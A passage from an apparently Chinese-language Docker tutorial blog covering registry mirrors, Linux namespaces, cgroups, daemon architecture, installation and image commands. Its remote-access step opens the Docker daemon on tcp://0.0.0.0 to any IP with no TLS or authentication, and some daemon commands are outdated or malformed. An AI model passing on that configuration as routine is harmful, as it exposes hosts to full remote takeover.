class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -<span class="selector-tag">p</span> /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon<span class="selector-class">.json</span> &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://xxxxxxx.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>　　除了使用公开服务外，用户还可以在 <strong>本地搭建私有 Docker Registry</strong> 。Docker 官方提供了 Docker Registry 镜像，可以直接使用做为私有 Registry 服务。开源的 Docker Registry 镜像只提供了 Docker Registry API 的服务端实现，足以支持 docker 命令，不影响使用。但不包含图形界面，以及镜像维护、用户管理、访问控制等高级功能。</p><h3 id="命名空间-Namespaces"><a href="#命名空间-Namespaces" class="headerlink" title="命名空间(Namespaces)"></a>命名空间(Namespaces)</h3><p><strong>pid namespace</strong></p><p>不同用户的进程就是通过 pid namespace 隔离开的，且不同 namespace 中可以有相同 PID。具有以下特征:</p><ul><li>每个 namespace 中的 pid 是有自己的 pid=1 的进程(类似 /sbin/init 进程)</li><li>每个 namespace 中的进程只能影响自己的同一个 namespace 或子 namespace 中的进程</li><li>因为 /proc 包含正在运行的进程，因此在 container 中的 pseudo-filesystem 的 /proc 目录只能看到自己 namespace 中的进程</li><li>因为 namespace 允许嵌套，父 namespace 可以影响子 namespace 的进程，所以子 namespace 的进程可以在父 namespace 中看到，但是具有不同的 pid<br>参考文档：<a href="https://blog.jtlebi.fr/2014/01/05/introduction-to-linux-namespaces-part-3-pid/" target="_blank" rel="noopener">Introduction to Linux namespaces – Part 3: PID</a></li></ul><p><strong>mnt namespace</strong></p><p>类似 chroot，将一个进程放到一个特定的目录执行。mnt namespace 允许不同 namespace 的进程看到的文件结构不同，这样每个 namespace 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个 namespace 中的 container 在 /proc/mounts 的信息只包含所在 namespace 的 mount point。</p><p><strong>net namespace</strong></p><p>网络隔离是通过 net namespace 实现的， 每个 net namespace 有独立的 network devices, IP addresses, IP routing tables, /proc/net 目录。这样每个 container 的网络就能隔离开来。 docker 默认采用 veth 的方式将 container 中的虚拟网卡同 host 上的一个 docker bridge 连接在一起。</p><p>参考文档：<a href="https://blog.jtlebi.fr/2014/01/19/introduction-to-linux-namespaces-part-5-net/" target="_blank" rel="noopener">Introduction to Linux namespaces – Part 5: NET</a></p><p><strong>uts namespace</strong></p><p>UTS (“UNIX Time-sharing System”) namespace 允许每个 container 拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 Host 上的一个进程。</p><p>参考文档：<a href="https://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/" target="_blank" rel="noopener">Introduction to Linux namespaces – Part 1: UTS</a></p><p><strong>ipc namespace</strong></p><p>container 中进程交互还是采用 Linux 常见的进程间交互方法 (interprocess communication - IPC), 包括常见的信号量、消息队列和共享内存。然而同 VM 不同，container 的进程间交互实际上还是 host 上具有相同 pid namespace 中的进程间交互，因此需要在IPC资源申请时加入 namespace 信息 - 每个 IPC 资源有一个唯一的 32bit ID。</p><p>参考文档：<a href="https://blog.jtlebi.fr/2013/12/28/introduction-to-linux-namespaces-part-2-ipc/" target="_blank" rel="noopener">Introduction to Linux namespaces – Part 2: IPC</a></p><p><strong>user namespace</strong></p><p>每个 container 可以有不同的 user 和 group id, 也就是说可以以 container 内部的用户在 container 内部执行程序而非 Host 上的用户。</p><p>有了以上 6 种 namespace 从进程、网络、IPC、文件系统、UTS 和用户角度的隔离，一个 container 就可以对外展现出一个独立计算机的能力，并且不同 container 从 OS 层面实现了隔离。 然而不同 namespace 之间资源还是相互竞争的，仍然需要类似 ulimit 来管理每个 container 所能使用的资源 - cgroup。</p><p><strong>Reference</strong></p><ul><li><a href="http://tiewei.github.io/cloud/Docker-Getting-Start/" target="_blank" rel="noopener">Docker Getting Start: Related Knowledge</a></li><li><a href="https://ruby-china.org/topics/22004" target="_blank" rel="noopener">Docker 介绍以及其相关术语、底层原理和技术</a></li></ul><h3 id="资源配额-cgroups"><a href="#资源配额-cgroups" class="headerlink" title="资源配额(cgroups)"></a>资源配额(cgroups)</h3><p><strong>cgroups</strong> 实现了对资源的配额和度量。 cgroups 的使用非常简单，提供类似文件的接口，在 /cgroup 目录下新建一个文件夹即可新建一个 group，在此文件夹中新建 task 文件，并将 pid 写入该文件，即可实现对该进程的资源控制。具体的资源配置选项可以在该文件夹中新建子 subsystem ，{子系统前缀}.{资源项} 是典型的配置方法， 如 memory.usageinbytes 就定义了该 group 在 subsystem memory 中的一个内存限制选项。 另外，cgroups 中的 subsystem 可以随意组合，一个 subsystem 可以在不同的 group 中，也可以一个 group 包含多个 subsystem - 也就是说一个 subsystem。</p><ul><li>memory<ul><li>内存相关的限制</li></ul></li><li>cpu<ul><li>在 cgroup 中，并不能像硬件虚拟化方案一样能够定义 CPU 能力，但是能够定义 CPU 轮转的优先级，因此具有较高 CPU 优先级的进程会更可能得到 CPU 运算。 通过将参数写入 cpu.shares ,即可定义改 cgroup 的 CPU 优先级 - 这里是一个相对权重，而非绝对值</li></ul></li><li>blkio<ul><li>block IO 相关的统计和限制，byte/operation 统计和限制 (IOPS 等)，读写速度限制等，但是这里主要统计的都是同步 IO</li></ul></li><li>devices<ul><li>设备权限限制</li></ul></li></ul><p>参考文档：<a href="http://tiewei.github.io/devops/howto-use-cgroup/" target="_blank" rel="noopener">how to use cgroup</a></p><h2 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h2><p>  <img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566323508565.png" alt></p><p>　 这张图展示了 Docker 客户端、服务端和 Docker 仓库（即 Docker Hub 和 Docker Cloud ），默认情况下Docker 会在 Docker 中央仓库寻找镜像文件，这种利用仓库管理镜像的设计理念类似于 Git ，当然这个仓库是可以通过修改配置来指定的，甚至我们可以创建我们自己的私有仓库。</p><p>  <code>Docker</code> 的核心组件包括：</p><ol><li>Docker Client</li><li>Docker daemon</li><li>Docker Image</li><li>Docker Registry</li><li>Docker Container</li></ol><p>Docker 采用的是 Client/Server 架构。客户端向服务器发送请求，服务器负责构建、运行和分发容器。客户端和服务器可以运行在同一个 Host 上，客户端也可以通过 socket 或 REST API 与远程的服务器通信。</p><h3 id="Docker-Client"><a href="#Docker-Client" class="headerlink" title="Docker Client"></a>Docker Client</h3><p>Docker Client ，也称 Docker 客户端。它其实就是 Docker 提供命令行界面 (CLI) 工具，是许多 Docker 用户与 Docker 进行交互的主要方式。客户端可以构建，运行和停止应用程序，还可以远程与Docker_Host进行交互。最常用的 Docker 客户端就是 docker 命令，我们可以通过 docker 命令很方便地在 host 上构建和运行 docker 容器。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367742090.png" alt></p><h3 id="Docker-daemon"><a href="#Docker-daemon" class="headerlink" title="Docker daemon"></a>Docker daemon</h3><p>Docker daemon 是服务器组件，以 Linux 后台服务的方式运行，是 Docker 最核心的后台进程，我们也把它称为守护进程。它负责响应来自 Docker Client 的请求，然后将这些请求翻译成系统调用完成容器管理操作。该进程会在后台启动一个 API Server ，负责接收由 Docker Client 发送的请求，接收到的请求将通过Docker daemon 内部的一个路由分发调度，由具体的函数来执行请求。</p><p>我们大致可以将其分为以下三部分：</p><ul><li>Docker Server</li><li>Engine</li><li>Job<br>Docker Daemon的架构如下所示：</li></ul><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367906404.png" alt></p><p>Docker Daemon 可以认为是通过 Docker Server 模块接受 Docker Client 的请求，并在 Engine 中处理请求，然后根据请求类型，创建出指定的 Job 并运行。 </p><p>Docker Daemon 运行在 Docker host 上，负责创建、运行、监控容器，构建、存储镜像。</p><p>运行过程的作用有以下几种可能：</p><ul><li>向 Docker Registry 获取镜像</li><li>通过 graphdriver 执行容器镜像的本地化操作</li><li>通过 networkdriver 执行容器网络环境的配置</li><li>通过 execdriver 执行容器内部运行的执行工作</li></ul><p>由于 Docker Daemon 和 Docker Client 的启动都是通过可执行文件 docker 来完成的，因此两者的启动流程非常相似。 Docker 可执行文件运行时，运行代码通过不同的命令行 flag 参数，区分两者，并最终运行两者各自相应的部分。</p><p>启动 Docker Daemon 时，一般可以使用以下命令来完成</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="attr">--daemon</span> = <span class="literal">true</span></span><br><span class="line">docker –d</span><br><span class="line">docker –<span class="attr">d</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>再由 docker 的 main() 函数来解析以上命令的相应 flag 参数，并最终完成 Docker Daemon 的启动。</p><p>下图可以很直观地看到 Docker Daemon 的启动流程：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368088582.png" alt></p><p>默认配置下， Docker daemon 只能响应来自本地 Host 的客户端请求。如果要允许远程客户端请求，需要在配置文件中打开 TCP 监听。我们可以照着如下步骤进行配置：</p><p>1、编辑配置文件 /etc/systemd/system/multi-user.target.wants/docker.service ，在环境变量 ExecStart 后面添加 -H tcp://0.0.0.0，允许来自任意 IP 的客户端连接。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368182628.png" alt></p><p>2、重启 Docker daemon</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">daemon-reload</span></span><br><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">docker</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure><p>3、我们通过以下命令即可实现与远程服务器通信</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> -H 服务器<span class="built_in">IP</span>地址 <span class="meta">info</span></span><br></pre></td></tr></table></figure><p><strong>-H</strong> 是用来指定服务器主机， <strong>info</strong> 子命令用于查看 Docker 服务器的信息</p><h3 id="Docker-Image"><a href="#Docker-Image" class="headerlink" title="Docker Image"></a>Docker Image</h3><p>Docker 镜像可以看作是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。我们可将 Docker 镜像看成只读模板，通过它可以创建 Docker 容器。</p><p>镜像有多种生成方法：</p><ol><li>从无到有开始创建镜像</li><li>下载并使用别人创建好的现成的镜像</li><li>在现有镜像上创建新的镜像</li></ol><p>我们可以将镜像的内容和创建步骤描述在一个文本文件中，这个文件被称作 <code>Dockerfile</code> ，通过执行 <code>docker build &lt;docker-file&gt;</code> 命令可以构建出 Docker 镜像,后面会详细介绍这个问题</p><h3 id="Docker-Registry-amp-Container"><a href="#Docker-Registry-amp-Container" class="headerlink" title="Docker Registry&amp;Container"></a>Docker Registry&amp;Container</h3><p>前面在讲基本概念的时候实际上已经很清楚了，这里不过多解释</p><p>Docker registry 是存储 docker image 的仓库，它在 docker 生态环境中的位置如下图所示：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566368568018.png" alt></p><p>运行docker push、docker pull、docker search时，实际上是通过 docker daemon 与 docker registry 通信。</p><p>Docker 容器就是 Docker 镜像的运行实例，是真正运行项目程序、消耗系统资源、提供服务的地方。 Docker Container 提供了系统硬件环境，我们可以使用 Docker Images 这些制作好的系统盘，再加上我们所编写好的项目代码， run 一下就可以提供服务啦。</p><hr><blockquote><p>Docker的概念基本上已经讲完，最后我们谈谈：Build, Ship, and Run。</p></blockquote><h2 id="最后谈谈-Build-Ship-and-Run"><a href="#最后谈谈-Build-Ship-and-Run" class="headerlink" title="最后谈谈:Build Ship and Run"></a>最后谈谈:Build Ship and Run</h2><p>如果你搜索Docker官网，会发现如下的字样：<strong>“Docker - Build, Ship, and Run Any App, Anywhere”</strong>。那么Build, Ship, and Run到底是在干什么呢？</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325436.jpg" alt="build ship run"></p><ul><li><strong>Build（构建镜像）</strong> ： 镜像就像是集装箱包括文件以及运行环境等等资源。</li><li><strong>Ship（运输镜像）</strong> ：主机和仓库间运输，这里的仓库就像是超级码头一样。</li><li><strong>Run （运行镜像）</strong> ：运行的镜像就是一个容器，容器就是运行程序的地方。</li></ul><p><strong>Docker 运行过程也就是去仓库把镜像拉到本地，然后用一条命令把镜像运行起来变成容器。所以，我们也常常将Docker称为码头工人或码头装卸工，这和Docker的中文翻译搬运工人如出一辙。</strong></p><p><strong>那么Docker组件是如何协作运行容器的呢？</strong></p><p>容器启动过程如下：</p><ul><li>Docker 客户端执行 docker run 命令</li><li>Docker daemon 发现本地没有 hello-world 镜像</li><li>daemon 从 Docker Hub 下载镜像</li><li>下载完成，镜像 hello-world 被保存到本地</li><li>Docker daemon 启动容器</li></ul><h1 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h1><hr><h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><p>Docker 的安装和使用有一些前提条件，主要体现在体系架构和内核的支持上。对于体系架构，除了 Docker 一开始就支持的 X86-64 ，其他体系架构的支持则一直在不断地完善和推进中。</p><p>Docker 分为 <strong>CE</strong> 和 <strong>EE</strong> 两大版本。 CE 即社区版（免费，支持周期 7 个月）， EE 即企业版，强调安全，付费使用，支持周期 24 个月。</p><p>我们在安装前可以参看官方文档获取最新的 Docker 支持情况，官方文档在这里：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>docs.docker.com<span class="regexp">/install/</span></span><br></pre></td></tr></table></figure><p>Docker 对于内核支持的功能，即内核的配置选项也有一定的要求(比如必须开启 <strong>Cgroup</strong> 和 <strong>Namespace</strong> 相关选项，以及其他的网络和存储驱动等)， Docker 源码中提供了一个检测脚本来检测和指导内核的配置，脚本链接在这里：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/docker/</span>docker<span class="regexp">/master/</span>contrib<span class="regexp">/check-config.sh</span></span><br></pre></td></tr></table></figure><p>在满足前提条件后，安装就变得非常的简单了。</p><p>Docker CE 的安装请参考官方文档：</p><ul><li>MacOS：<a href="https://docs.docker.com/docker-for-mac/install/" target="_blank" rel="noopener">https://docs.docker.com/docker-for-mac/install/</a></li><li>Windows：<a href="https://docs.docker.com/docker-for-windows/install/" target="_blank" rel="noopener">https://docs.docker.com/docker-for-windows/install/</a></li><li>Ubuntu：<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></li><li>Debian：<a href="https://docs.docker.com/install/linux/docker-ce/debian/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/debian/</a></li><li>CentOS：<a href="https://docs.docker.com/install/linux/docker-ce/centos/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/centos/</a></li><li>Fedora：<a href="https://docs.docker.com/install/linux/docker-ce/fedora/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/fedora/</a></li><li>其他 Linux 发行版：<a href="https://docs.docker.com/install/linux/docker-ce/binaries/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/binaries/</a></li></ul><p>运行 docker version or docker info 验证是否安装成功</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">λ</span> <span class="string">docker</span> <span class="string">version</span></span><br><span class="line"><span class="attr">Client:</span> <span class="string">Docker</span> <span class="string">Engine</span> <span class="bullet">-</span> <span class="string">Community</span></span><br><span class="line"><span class="attr"> Version:</span>           <span class="number">19.03</span><span class="number">.1</span></span><br><span class="line"> <span class="string">API</span> <span class="attr">version:</span>       <span class="number">1.40</span></span><br><span class="line"> <span class="string">Go</span> <span class="attr">version:</span>        <span class="string">go1.12.5</span></span><br><span class="line"> <span class="string">Git</span> <span class="attr">commit:</span>        <span class="number">74</span><span class="string">b1e89</span></span><br><span class="line"><span class="attr"> Built:</span>             <span class="string">Thu</span> <span class="string">Jul</span> <span class="number">25</span> <span class="number">21</span><span class="string">:17:08</span> <span class="number">2019</span></span><br><span class="line"> <span class="string">OS/Arch:</span>           <span class="string">windows/amd64</span></span><br><span class="line"><span class="attr"> Experimental:</span>      <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>在linux下还需手动确保可以正常启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start docker</span></span><br></pre></td></tr></table></figure><blockquote><p>目前docker在windows家庭版中安装还比较坑，你需要手动安装Hyper-V服务(.cmd文件内容如下)，并绕过docker安装程序的系统版本检测，另外，安装时不要勾选：use windows containers instead of linux containers</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushd <span class="string">"%~dp0"</span></span><br><span class="line">dir <span class="string">/b</span> %SystemRoot%\servicing\Packages\*Hyper-V*<span class="string">.mum</span> &gt;hyper-v.txt</span><br><span class="line">for <span class="string">/f</span> %%i in <span class="params">('findstr /i . hyper-v.txt 2^&gt;nul')</span> do dism <span class="string">/online</span> <span class="string">/norestart</span> <span class="string">/add-package</span>:<span class="string">"%SystemRoot%\servicing\Packages\%%i"</span></span><br><span class="line">del hyper-v.txt</span><br><span class="line">Dism <span class="string">/online</span> <span class="string">/enable-feature</span> <span class="string">/featurename</span><span class="function">:Microsoft-Hyper-V-All</span> <span class="string">/LimitAccess</span> <span class="string">/ALL</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566326683602.png" alt></p><h2 id="Docker-image"><a href="#Docker-image" class="headerlink" title="Docker-image"></a>Docker-image</h2><blockquote><p>镜像作为 Docker 三大核心概念中，最重要的一个关键词，它有很多操作，是您想学习容器技术不得不掌握的。</p></blockquote><h3 id="Docker-下载镜像"><a href="#Docker-下载镜像" class="headerlink" title="Docker 下载镜像"></a>Docker 下载镜像</h3><p>如果我们想要在本地运行容器，就必须保证本地存在对应的镜像。所以，第一步，我们需要下载镜像。当我们尝试下载镜像时，Docker 会尝试先从默认的镜像仓库（默认使用 Docker Hub 公共仓库）去下载，当然了，用户也可以自定义配置想要下载的镜像仓库。</p><p><strong>下载镜像</strong></p><p>镜像是运行容器的前提，我们可以使用 <code>docker pull[IMAGE_NAME]:[TAG]</code>命令来下载镜像，其中 <code>IMAGE_NAME</code> 表示的是镜像的名称，而 <code>TAG</code> 是镜像的标签，也就是说我们需要通过 “<strong>镜像 + 标签</strong>” 的方式来下载镜像。</p><p>具体的选项可以通过 docker pull –help 命令看到，这里我们说一下镜像名称的格式。</p><ul><li>Docker 镜像仓库地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。</li></ul><p><strong>注意：</strong> 您也可以不显式地指定 TAG, 它会默认下载 latest 标签，也就是下载仓库中最新版本的镜像。这里并不推荐您下载 latest 标签，因为该镜像的内容会跟踪镜像的最新版本，并随之变化，所以它是不稳定的。在生产环境中，可能会出现莫名其妙的 bug, 推荐您最好还是显示的指定具体的 TAG。</p><p>举个例子，如我们想要下载一个 Mysql 5.7 镜像，可以通过命令来下载：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p>会看到控制台输出内容如下：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219080097.png" alt></p><p><strong>注意：</strong> 由于官方 DockerHub 仓库服务器在国外，下载速度较慢，所以我将仓库的地址更改成了国内的 <code>docker.io</code> 的镜像仓库，所以在上图中，镜像前面会有 <code>docker.io</code> 出现。</p><p>当有 <strong>Downloaded</strong> 字符串输出的时候，说明下载成功了！！</p><p> <strong>验证</strong></p><p>让我们来验证一下，本地是否存在 Mysql5.7 的镜像，运行命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219176362.png" alt></p><p>可以看到本地的确存在该镜像，确实是下载成功了！</p><p><strong>下载镜像相关细节</strong></p><p>再说说上面下载镜像的过程：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219262413.png" alt></p><p>通过下载过程，可以看到，一个镜像一般是由多个层（ <code>layer</code>） 组成，类似 <code>9fc222b64b0a</code>这样的串表示层的唯一 ID（实际上完整的 ID 包括了 256 个 bit, 64 个十六进制字符组成）。</p><p><strong>您可能会想，如果多个不同的镜像中，同时包含了同一个层（ layer）,这样重复下载，岂不是导致了存储空间的浪费么?</strong></p><p>实际上，Docker 并不会这么傻会去下载重复的层（ <code>layer</code>）,Docker 在下载之前，会去检测本地是否会有同样 ID 的层，如果本地已经存在了，就直接使用本地的就好了。</p><p><strong>另一个问题，不同仓库中，可能也会存在镜像重名的情况发生, 这种情况咋办？</strong></p><p>严格意义上，我们在使用 <code>docker pull</code> 命令时，还需要在镜像前面指定仓库地址( <code>Registry</code>), 如果不指定，则 Docker 会使用您默认配置的仓库地址。例如上面，由于我配置的是国内 <code>docker.io</code> 的仓库地址，我在 <code>pull</code> 的时候，docker 会默认为我加上 <code>docker.io/library</code> 的前缀。</p><p>如：当我执行 <code>docker pull mysql:5.7</code> 命令时，实际上相当于 <code>docker pull docker.io/mysql:5.7</code>，如果您未自定义配置仓库，则默认在下载的时候，会在镜像前面加上 DockerHub 的地址。</p><p>Docker 通过前缀地址的不同，来保证不同仓库中，重名镜像的唯一性。</p><p><strong>PULL 子命令</strong></p><p>命令行中输入：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull <span class="comment">--help</span></span><br></pre></td></tr></table></figure><p>会得到如下信息：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntuweb</span><span class="symbol">:/</span><span class="comment"># docker pull --help</span></span><br><span class="line"><span class="symbol">Usage:</span>  docker pull [OPTIONS] NAME[<span class="symbol">:TAG|</span><span class="variable">@DIGEST</span>]</span><br><span class="line">Pull an image <span class="keyword">or</span> a repository from a registry</span><br><span class="line"><span class="symbol">Options:</span>  -a, --all-tags                Download all tagged images <span class="keyword">in</span> the repository      --disable-content-trust   Skip image verification (default <span class="keyword">true</span>)      --help                    Print usage</span><br></pre></td></tr></table></figure><p>我们可以看到主要支持的子命令有：</p><ol><li><code>-a,--all-tags=true|false</code>: 是否获取仓库中所有镜像，默认为否；</li><li><code>--disable-content-trust</code>: 跳过镜像内容的校验，默认为 true;</li></ol><h3 id="Docker-查看镜像信息"><a href="#Docker-查看镜像信息" class="headerlink" title="Docker 查看镜像信息"></a>Docker 查看镜像信息</h3><p><strong>images 命令列出镜像</strong></p><p>通过使用如下两个命令，列出本机已有的镜像：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>或：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">image</span> <span class="keyword">ls</span></span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219890517.png" alt></p><p>对上述红色标注的字段做一下解释：</p><ul><li><strong>REPOSITORY</strong>: 来自于哪个仓库；</li><li><strong>TAG</strong>: 镜像的标签信息，比如 5.7、latest 表示不同的版本信息；</li><li><strong>IMAGE ID</strong>: 镜像的 ID, 如果您看到两个 ID 完全相同，那么实际上，它们指向的是同一个镜像，只是标签名称不同罢了；</li><li><strong>CREATED</strong>: 镜像最后的更新时间；</li><li><strong>SIZE</strong>: 镜像的大小，优秀的镜像一般体积都比较小，这也是我更倾向于使用轻量级的 alpine 版本的原因；</li></ul><blockquote><p>注意：图中的镜像大小信息只是逻辑上的大小信息，因为一个镜像是由多个镜像层（ <code>layer</code>）组成的，而相同的镜像层本地只会存储一份，所以，真实情况下，占用的物理存储空间大小，可能会小于逻辑大小。由于 Docker 镜像是多层存储结构，并且可以继承、复用，因此不同镜像可能会因为使用相同的基础镜像，从而拥有共同的层。由于 Docker 使用 Union FS，相同的层只需要保存一份即可，因此实际镜像硬盘占用空间很可能要比这个列表镜像大小的总和要小的多。</p></blockquote><p>你可以通过以下命令来便捷的查看镜像、容器、数据卷所占用的空间。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># docker system df</span><br><span class="line">TYPE                TOTAL               <span class="literal">ACTIVE</span>              SIZE                RECLAIMABLE</span><br><span class="line">Images              <span class="number">7</span>                   <span class="number">3</span>                   <span class="number">514.4</span>MB             <span class="number">415.2</span>MB (<span class="number">80</span>%)</span><br><span class="line">Containers          <span class="number">3</span>                   <span class="number">0</span>                   <span class="number">512.1</span>kB             <span class="number">512.1</span>kB (<span class="number">100</span>%)</span><br><span class="line">Local Volumes       <span class="number">1</span>                   <span class="number">1</span>                   <span class="number">105</span>B                <span class="number">0</span>B (<span class="number">0</span>%)</span><br><span class="line">Build Cache         <span class="number">0</span>                   <span class="number">0</span>                   <span class="number">0</span>B                  <span class="number">0</span>B</span><br></pre></td></tr></table></figure><p><strong>使用 tag 命令为镜像添加标签</strong></p><p>通常情况下，为了方便在后续工作中，快速地找到某个镜像，我们可以使用 <code>docker tag</code> 命令，为本地镜像添加一个新的标签。为 <code>mysql</code> 镜像，添加新的镜像标签 <code>allen_mysql:5.7</code>。然后使用 <code>docker images</code> 命令，查看本地镜像。如下图所示：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220226865.png" alt></p><p>可以看到，本地多了一个 <code>qymua_mysql:5.7</code> 的镜像。细心的你一定还会发现， <code>qymua_mysql:5.7</code> 和 <code>mysql:5.7</code> 的镜像 ID 是一模一样的，说明它们是同一个镜像，只是别名不同而已。</p><p><code>docker tag</code> 命令功能更像是, 为指定镜像添加快捷方式一样。</p><p><strong>使用 inspect 命令查看镜像详细信息</strong></p><p>通过 <code>docker inspect</code> 命令，我们可以获取镜像的详细信息，其中，包括创建者，各层的数字摘要等。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">inspect</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p><code>docker inspect</code> 返回的是 <code>JSON</code> 格式的信息，如果您想获取其中指定的一项内容，可以通过 <code>-f</code> 来指定，如获取镜像大小：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -<span class="class">f </span>&#123;&#123;<span class="string">".Size"</span>&#125;&#125; mysql:<span class="number">5.7</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220392748.png" alt></p><p><strong>使用 history 命令查看镜像历史</strong></p><p>前面的小节中，我们知道了，一个镜像是由多个层（layer）组成的，那么，我们要如何知道各个层的具体内容呢？</p><p>通过 <code>docker history</code> 命令，可以列出各个层（layer）的创建信息，如我们查看 <code>mysql:5.7</code> 的各层信息：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">history</span> mysq<span class="variable">l:5</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220496025.png" alt></p><p>可以看到，上面过长的信息，为了方便展示，后面都省略了，如果您想要看具体信息，可以通过添加 